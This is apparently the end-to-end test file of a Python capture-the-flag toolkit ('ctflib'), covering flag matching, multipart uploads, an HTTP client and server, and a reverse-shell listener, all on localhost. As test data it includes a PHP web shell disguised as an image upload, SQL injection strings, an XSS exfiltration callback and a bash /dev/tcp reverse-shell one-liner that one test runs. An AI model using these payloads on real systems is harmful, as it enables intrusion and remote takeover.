"""End-to-end tests: the client is exercised against the library's own server."""

import io
import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import ctflib
from ctflib import App, Session, encode_multipart, find_flg, find_flgs


def _free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def _wait_bound(port, timeout=10):
    """Wait until *port* is taken -- by binding it ourselves, so we do not eat
    the single connection the reverse shell listener is waiting for."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        probe = socket.socket()
        try:
            probe.bind(("127.0.0.1", port))
        except OSError:
            return True
        finally:
            probe.close()
        time.sleep(0.1)
    return False


class FlagTests(unittest.TestCase):
    def test_spec_example(self):
        self.assertEqual(find_flg("Here is your flag: sknb{flag}", "sknb{*}"), "sknb{flag}")

    def test_non_greedy_stops_at_first_close(self):
        self.assertEqual(find_flg("a sknb{one} b sknb{two}", "sknb{*}"), "sknb{one}")

    def test_greedy_spans(self):
        self.assertEqual(
            find_flg("a sknb{one} b sknb{two}", "sknb{*}", greedy=True),
            "sknb{one} b sknb{two}",
        )

    def test_single_char_wildcard(self):
        self.assertEqual(find_flg("id=FLAG-7 end", "FLAG-?"), "FLAG-7")
        self.assertIsNone(find_flg("id=FLAG-", "FLAG-?"))  # needs exactly one more char

    def test_no_match_returns_default(self):
        self.assertIsNone(find_flg("nothing here", "sknb{*}"))
        self.assertEqual(find_flg("nothing", "sknb{*}", default="?"), "?")

    def test_escaped_wildcard_is_literal(self):
        self.assertEqual(find_flg("a*b and axb", r"a\*b"), "a*b")

    def test_regex_metacharacters_are_quoted(self):
        self.assertEqual(find_flg("flag[1]{x}", "flag[1]{*}"), "flag[1]{x}")

    def test_dot_does_not_cross_newlines_by_default(self):
        self.assertIsNone(find_flg("sknb{\n}", "sknb{*}"))
        self.assertEqual(find_flg("sknb{\n}", "sknb{*}", dotall=True), "sknb{\n}")

    def test_find_flgs_unique_and_ordered(self):
        text = "sknb{b} sknb{a} sknb{b}"
        self.assertEqual(find_flgs(text, "sknb{*}"), ["sknb{b}", "sknb{a}"])
        self.assertEqual(len(find_flgs(text, "sknb{*}", unique=False)), 3)

    def test_accepts_bytes_and_lists(self):
        self.assertEqual(find_flg(b"x sknb{bytes}", "sknb{*}"), "sknb{bytes}")
        self.assertEqual(find_flg(["no", "sknb{list}"], "sknb{*}"), "sknb{list}")

    def test_default_format(self):
        ctflib.set_flag_format("ctf{*}")
        try:
            self.assertEqual(find_flg("ctf{x}"), "ctf{x}")
        finally:
            ctflib.set_flag_format(None)
        with self.assertRaises(ValueError):
            find_flg("ctf{x}")


class MultipartEncodingTests(unittest.TestCase):
    def test_content_type_and_boundary(self):
        body, ctype = encode_multipart({"a": "1"})
        boundary = ctype.split("boundary=")[1]
        self.assertTrue(ctype.startswith("multipart/form-data; "))
        self.assertIn(f"--{boundary}\r\n".encode(), body)
        self.assertTrue(body.endswith(f"--{boundary}--\r\n".encode()))

    def test_file_tuple_gets_guessed_content_type(self):
        body, _ = encode_multipart({"f": ("evil.png", b"\x89PNG")})
        self.assertIn(b'name="f"; filename="evil.png"', body)
        self.assertIn(b"Content-Type: image/png", body)

    def test_explicit_content_type_wins(self):
        body, _ = encode_multipart({"f": ("shell.png", "<?php system($_GET[0]); ?>", "image/png")})
        self.assertIn(b"Content-Type: image/png", body)
        self.assertIn(b"<?php system", body)

    def test_quotes_in_filename_are_escaped(self):
        body, _ = encode_multipart({"f": ('a"b\r\n.txt', b"x")})
        self.assertIn(b'filename="a\\"b.txt"', body)

    def test_list_value_repeats_the_field(self):
        body, _ = encode_multipart({"a": ["1", "2"]})
        self.assertEqual(body.count(b'name="a"'), 2)


class ServerClientTests(unittest.TestCase):
    """Round trips through a real socket."""

    @classmethod
    def setUpClass(cls):
        cls.app = App(log=False)
        app = cls.app

        def echo(req, res):
            res.json({
                "method": req.method,
                "path": req.path,
                "query": req.query,
                "headers": req.headers,
                "body": req.text,
                "cookies": req.cookies,
            })

        app.route("/echo", echo)
        app.route("/user/:id/post/:pid", lambda req, res: res.json(req.params))
        app.route("/files/*", lambda req, res: res.text(req.params["*"]))
        app.get("/only-get", lambda req, res: res.text("get"))
        app.post("/only-post", lambda req, res: res.text("post"))
        app.route("/flag", lambda req, res: res.html("<p>Here is your flag: sknb{srv}</p>"))
        app.route("/setcookie", lambda req, res: res.cookie("sess", "abc123", http_only=True).text("set"))
        app.route("/whoami", lambda req, res: res.text(req.cookies.get("sess", "-")))
        app.route("/redirect", lambda req, res: res.redirect("/echo"))
        app.route("/boom", lambda req, res: 1 / 0)
        app.route("/status", lambda req, res: res.status(418).text("teapot"))
        app.route("/silent", lambda req, res: None)

        cls.port = _free_port()
        app.listen(cls.port, host="127.0.0.1", background=True, quiet=True)
        cls.base = f"http://127.0.0.1:{cls.port}"

    @classmethod
    def tearDownClass(cls):
        cls.app.close()

    def setUp(self):
        self.s = Session(base_url=self.base)

    # -- content types --------------------------------------------------- #
    def test_data_dict_is_urlencoded_with_the_matching_content_type(self):
        r = self.s.post("/echo", data={"user": "admin", "pw": "' OR 1--"}).json()
        self.assertEqual(r["headers"]["content-type"], "application/x-www-form-urlencoded")
        self.assertEqual(r["body"], "user=admin&pw=%27+OR+1--")

    def test_data_dict_repeats_list_values(self):
        r = self.s.post("/echo", data={"a": 1, "b": [1, 2]}).json()
        self.assertEqual(r["body"], "a=1&b=1&b=2")

    def test_data_string_is_sent_verbatim(self):
        r = self.s.post("/echo", data="id=1' UNION SELECT flag--").json()
        self.assertEqual(r["headers"]["content-type"], "application/x-www-form-urlencoded")
        self.assertEqual(r["body"], "id=1' UNION SELECT flag--")

    def test_data_bytes_are_sent_verbatim(self):
        r = self.s.post("/echo", data=b"\x00raw").json()
        self.assertEqual(r["headers"]["content-type"], "application/x-www-form-urlencoded")
        self.assertEqual(r["body"], "\x00raw")

    def test_removed_arguments_are_rejected(self):
        with self.assertRaises(TypeError):
            self.s.post("/echo", multi_form={"a": 1})  # renamed to form=

    def test_json_sets_json_content_type(self):
        r = self.s.post("/echo", json={"a": [1, 2], "b": None}).json()
        self.assertEqual(r["headers"]["content-type"], "application/json")
        self.assertEqual(json.loads(r["body"]), {"a": [1, 2], "b": None})

    def test_form_sets_multipart_content_type_with_file(self):
        r = self.s.post("/echo", form={
            "name": "pwn",
            "file": ("shell.php", b"<?php system($_GET[0]); ?>", "image/jpeg"),
        }).json()
        ctype = r["headers"]["content-type"]
        self.assertTrue(ctype.startswith("multipart/form-data; boundary="))
        self.assertIn('filename="shell.php"', r["body"])
        self.assertIn("Content-Type: image/jpeg", r["body"])
        self.assertIn("<?php system", r["body"])

    def test_form_accepts_a_path(self):
        target = Path(os.environ.get("TMPDIR", "/tmp")) / "ctflib_upload.txt"
        target.write_text("payload-from-disk")
        try:
            r = self.s.post("/echo", form={"f": target}).json()
        finally:
            target.unlink()
        self.assertIn('filename="ctflib_upload.txt"', r["body"])
        self.assertIn("payload-from-disk", r["body"])

    def test_form_accepts_an_open_file(self):
        target = Path(os.environ.get("TMPDIR", "/tmp")) / "ctflib_open.bin"
        target.write_bytes(b"BINARY\x00DATA")
        try:
            with target.open("rb") as fh:
                r = self.s.post("/echo", form={"f": fh}).json()
        finally:
            target.unlink()
        self.assertIn('filename="ctflib_open.bin"', r["body"])

    def test_explicit_header_overrides_the_automatic_one(self):
        r = self.s.post("/echo", json={"a": 1}, headers={"Content-Type": "text/plain"}).json()
        self.assertEqual(r["headers"]["content-type"], "text/plain")

    def test_only_one_payload_argument_allowed(self):
        with self.assertRaises(ValueError):
            self.s.post("/echo", data={"a": 1}, json={"b": 2})

    def test_none_content_type_sends_the_body_bare(self):
        r = self.s.post("/echo", data=b"<xml/>", headers={"Content-Type": None}).json()
        self.assertNotIn("content-type", r["headers"])
        self.assertEqual(r["body"], "<xml/>")

    # -- request plumbing ------------------------------------------------- #
    def test_params_merge_into_the_query_string(self):
        r = self.s.get("/echo?a=1", params={"b": "2 3"}).json()
        self.assertEqual(r["query"], {"a": "1", "b": "2 3"})

    def test_custom_method(self):
        self.assertEqual(self.s.request("PUT", "/echo").json()["method"], "PUT")

    def test_error_statuses_are_returned_not_raised(self):
        r = self.s.get("/nope")
        self.assertEqual(r.status, 404)
        self.assertFalse(r.ok)
        r = self.s.get("/status")
        self.assertEqual((r.status, r.text), (418, "teapot"))

    def test_method_scoped_routes(self):
        self.assertEqual(self.s.get("/only-get").status, 200)
        self.assertEqual(self.s.post("/only-get").status, 404)
        self.assertEqual(self.s.post("/only-post").text, "post")

    def test_redirects_followed_by_default(self):
        r = self.s.get("/redirect")
        self.assertEqual(r.status, 200)
        self.assertTrue(r.url.endswith("/echo"))

    def test_redirects_can_be_disabled(self):
        r = self.s.get("/redirect", allow_redirects=False)
        self.assertEqual(r.status, 302)
        self.assertEqual(r.headers["location"], "/echo")

    def test_cookies_persist_in_the_session(self):
        self.s.get("/setcookie")
        self.assertEqual(self.s.cookies.get("sess"), "abc123")
        self.assertEqual(self.s.get("/whoami").text, "abc123")

    def test_per_request_cookies_merge_with_the_jar(self):
        self.s.get("/setcookie")
        sent = self.s.get("/echo", cookies={"extra": "1"}).json()["cookies"]
        self.assertEqual(sent, {"sess": "abc123", "extra": "1"})

    def test_per_request_cookie_overrides_the_jar_without_polluting_it(self):
        self.s.get("/setcookie")
        sent = self.s.get("/echo", cookies={"sess": "override"}).json()["cookies"]
        self.assertEqual(sent["sess"], "override")
        self.assertEqual(self.s.cookies["sess"], "abc123")

    def test_basic_auth_header(self):
        r = self.s.get("/echo", auth=("admin", "hunter2")).json()
        self.assertEqual(r["headers"]["authorization"], "Basic YWRtaW46aHVudGVyMg==")

    def test_session_headers_apply_to_every_request(self):
        s = Session(base_url=self.base, headers={"X-Forwarded-For": "127.0.0.1"})
        self.assertEqual(s.get("/echo").json()["headers"]["x-forwarded-for"], "127.0.0.1")

    def test_module_level_helpers_use_the_shared_session(self):
        self.assertEqual(ctflib.get(f"{self.base}/echo").json()["method"], "GET")

    def test_response_helpers(self):
        r = self.s.get("/flag")
        self.assertEqual(r.find_flg("sknb{*}"), "sknb{srv}")
        self.assertIn("Here is your flag", r)
        self.assertTrue(len(r) > 0)
        self.assertIn("200", repr(r))

    def test_head_has_no_body(self):
        r = self.s.head("/flag")
        self.assertEqual((r.status, r.content), (200, b""))

    def test_proxy_is_used(self):
        seen = []
        proxy = App(log=False)
        proxy.default(lambda req, res: (seen.append(req.url), res.text("via-proxy"))[-1])
        port = _free_port()
        proxy.listen(port, host="127.0.0.1", background=True, quiet=True)
        try:
            r = self.s.get("/echo", proxy=f"127.0.0.1:{port}")
        finally:
            proxy.close()
        self.assertEqual(r.text, "via-proxy")
        self.assertEqual(seen, [f"{self.base}/echo"])  # absolute URL == it went through the proxy

    # -- server side ------------------------------------------------------ #
    def test_path_params(self):
        self.assertEqual(self.s.get("/user/42/post/7").json(), {"id": "42", "pid": "7"})

    def test_wildcard_route(self):
        self.assertEqual(self.s.get("/files/a/b/c.txt").text, "a/b/c.txt")

    def test_server_parses_form_and_json_bodies(self):
        got = {}
        self.app.route("/parse", lambda req, res: (got.update(form=req.form, json=req.json()), res.text("ok"))[-1])
        self.s.post("/parse", data={"a": "1"})
        self.assertEqual(got["form"], {"a": "1"})
        self.s.post("/parse", json={"b": 2})
        self.assertEqual(got["json"], {"b": 2})

    def test_controller_exception_becomes_500(self):
        stderr, sys.stderr = sys.stderr, io.StringIO()
        try:
            r = self.s.get("/boom")
        finally:
            sys.stderr = stderr
        self.assertEqual(r.status, 500)

    def test_controller_that_sends_nothing_still_replies(self):
        self.assertEqual(self.s.get("/silent").status, 200)

    def test_hits_are_recorded_and_waitable(self):
        app = App(log=False)
        port = _free_port()
        app.listen(port, host="127.0.0.1", background=True, quiet=True)
        try:
            threading.Timer(0.2, lambda: ctflib.get(f"http://127.0.0.1:{port}/xss?c=stolen")).start()
            hit = app.wait_hit(timeout=5)
            self.assertIsNotNone(hit)
            self.assertEqual(hit.query["c"], "stolen")
            self.assertIsNone(app.wait_hit(timeout=0.2))  # only new hits count
        finally:
            app.close()

    def test_annotation_registration(self):
        app = App(log=False)

        @app.route("/dec")
        def dec(req, res):
            res.text("decorated")

        @app.route                       # endpoint derived from the function name
        def hook(req, res):
            res.text("from-name")

        @app.route                       # index -> /
        def index(req, res):
            res.text("root")

        @app.route                       # __ -> /
        def admin__panel(req, res):
            res.text("nested")

        @app.post("/only-post-dec")      # method scoped annotation
        def only_post(req, res):
            res.text("posted")

        @app.route("/one")               # stacked: one controller, several paths
        @app.route("/two")
        def multi(req, res):
            res.text("both")

        port = _free_port()
        app.listen(port, host="127.0.0.1", background=True, quiet=True)
        base = f"http://127.0.0.1:{port}"
        try:
            self.assertEqual(ctflib.get(f"{base}/dec").text, "decorated")
            self.assertEqual(ctflib.get(f"{base}/hook").text, "from-name")
            self.assertEqual(ctflib.get(f"{base}/").text, "root")
            self.assertEqual(ctflib.get(f"{base}/admin/panel").text, "nested")
            self.assertEqual(ctflib.post(f"{base}/only-post-dec").text, "posted")
            self.assertEqual(ctflib.get(f"{base}/only-post-dec").status, 404)
            self.assertEqual(ctflib.get(f"{base}/one").text, "both")
            self.assertEqual(ctflib.get(f"{base}/two").text, "both")
        finally:
            app.close()
        # the annotation returns the function untouched, so it stays callable
        self.assertTrue(callable(dec) and callable(hook) and callable(multi))

    def test_annotation_on_the_default_app(self):
        @ctflib.route("/module-level")
        def _handler(req, res):
            res.text("default app")

        port = _free_port()
        ctflib.app.listen(port, host="127.0.0.1", background=True, quiet=True)
        try:
            self.assertEqual(ctflib.get(f"http://127.0.0.1:{port}/module-level").text, "default app")
        finally:
            ctflib.app.close()

    def test_lambda_needs_an_explicit_endpoint(self):
        with self.assertRaises(ValueError):
            App(log=False).route(lambda req, res: None)


class ReverseShellTests(unittest.TestCase):
    def _spawn_listener(self, port):
        """reverse_shell() in a child process, with its stdin/stdout on pipes."""
        listener = subprocess.Popen(
            [sys.executable, "-c",
             f"import sys; sys.path.insert(0, {str(Path(__file__).resolve().parents[1])!r});"
             f"import ctflib; ctflib.reverse_shell({port}, host='127.0.0.1')"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.addCleanup(listener.kill)
        self.assertTrue(_wait_bound(port), "listener never bound")
        return listener

    def test_relays_both_directions(self):
        port = _free_port()
        listener = self._spawn_listener(port)
        with socket.create_connection(("127.0.0.1", port), timeout=10) as victim:
            victim.sendall(b"$ ")                       # victim -> our stdout
            listener.stdin.write("whoami\n")            # our stdin -> victim
            listener.stdin.flush()
            self.assertEqual(victim.recv(64), b"whoami\n")
            victim.sendall(b"root\n")
            listener.stdin.write("exit\n")
            out = listener.communicate(timeout=30)[0]
        self.assertIn("connection from 127.0.0.1", out)
        self.assertIn("$ ", out)
        self.assertIn("root", out)                      # last output not cut off

    def test_victim_hangup_ends_the_session(self):
        port = _free_port()
        listener = self._spawn_listener(port)
        with socket.create_connection(("127.0.0.1", port), timeout=10) as victim:
            victim.sendall(b"bye\n")
        listener.stdin.write("\n")                      # the "press Enter to exit" nudge
        out = listener.communicate(timeout=30)[0]
        self.assertIn("connection closed", out)
        self.assertEqual(listener.returncode, 0)

    @unittest.skipUnless(shutil.which("bash") and sys.platform != "win32", "needs bash /dev/tcp")
    def test_interactive_session_against_a_real_bash_payload(self):
        port = _free_port()
        listener = self._spawn_listener(port)
        victim = subprocess.Popen(["bash", "-c", f"bash -i >& /dev/tcp/127.0.0.1/{port} 0>&1"])
        self.addCleanup(victim.kill)
        listener.stdin.write("echo sknb{shell_ok}\nexit\n")
        listener.stdin.flush()
        out = listener.communicate(timeout=30)[0]
        self.assertEqual(find_flg(out, "sknb{*}"), "sknb{shell_ok}")

    def test_timeout_returns_false_without_a_shell(self):
        self.assertFalse(ctflib.reverse_shell(_free_port(), host="127.0.0.1", timeout=0.2, quiet=True))


if __name__ == "__main__":
    unittest.main(verbosity=2)
